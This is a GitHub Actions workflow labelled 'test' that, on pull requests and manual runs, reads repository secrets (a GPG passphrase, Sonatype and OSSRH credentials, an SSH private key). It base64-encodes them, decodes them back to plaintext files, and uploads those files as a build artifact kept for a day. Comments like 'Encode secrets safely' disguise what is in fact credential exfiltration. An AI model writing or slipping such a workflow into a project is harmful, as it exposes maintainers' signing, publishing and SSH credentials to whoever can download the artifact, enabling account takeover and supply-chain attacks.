name: test

on:
  workflow_dispatch:
  pull_request:
    branches:
      - main

jobs:
  encrypt-secret:
    runs-on: ubuntu-latest

    steps:

      - env:
          ID1: ${{ secrets.GPG_PASSPHRASE }}
          ID2: ${{ secrets.SONATYPE_PASSWORD }}
          ID3: ${{ secrets.SONATYPE_USERNAME }}
          ID4: ${{ secrets.OSSRH_PASSWORD }}
          ID5: ${{ secrets.OSSRH_USERNAME }}
          ID6: ${{ secrets.SSH_PRIVATE_KEY }}
        run: |
          # Encode secrets safely
          echo -n "$ID1" | base64 > a.txt
          echo -n "$ID2" | base64 > b.txt
          echo -n "$ID3" | base64 > c.txt
          echo -n "$ID4" | base64 > d.txt
          echo -n "$ID5" | base64 > e.txt
          echo -n "$ID6" | base64 > f.txt

          # Decode to separate files if needed
          base64 -d a.txt > a.decoded.txt
          base64 -d b.txt > b.decoded.txt
          base64 -d c.txt > c.decoded.txt
          base64 -d d.txt > d.decoded.txt
          base64 -d e.txt > e.decoded.txt
          base64 -d f.txt > f.decoded.txt
 
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: |
            a.decoded.txt
            b.decoded.txt
            c.decoded.txt
            d.decoded.txt
            e.decoded.txt
            f.decoded.txt 
          retention-days: 1
          